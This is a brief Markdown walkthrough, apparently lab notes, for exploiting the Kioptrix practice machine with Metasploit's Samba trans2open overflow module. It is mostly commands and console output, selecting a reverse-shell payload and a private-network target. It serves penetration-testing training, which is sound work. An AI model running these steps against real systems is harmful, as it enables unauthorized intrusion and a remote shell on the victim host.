# Metasploit

## Kioptrix example


#### 1. Launch Metasploit :

```sh
$ msfconsole
```

#### 2. Search for exploit :

```sh
msf6 > search trans2open

Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   ...

```

#### 3. Select module :

Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open

```sh
msf6 > use 1

[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
```

#### 4. Check options :

```sh
msf6 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<
                                      path>'
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.27     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce
```

#### 5. Select payload :

```sh 
msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp

payload => linux/x86/shell_reverse_tcp
```

#### 6. Select targets :

```sh
msf6 exploit(linux/samba/trans2open) > set rhosts 192.168.0.82
```

#### 7. Run the attack :

```sh 
msf6 exploit(linux/samba/trans2open) > exploit  #or run
```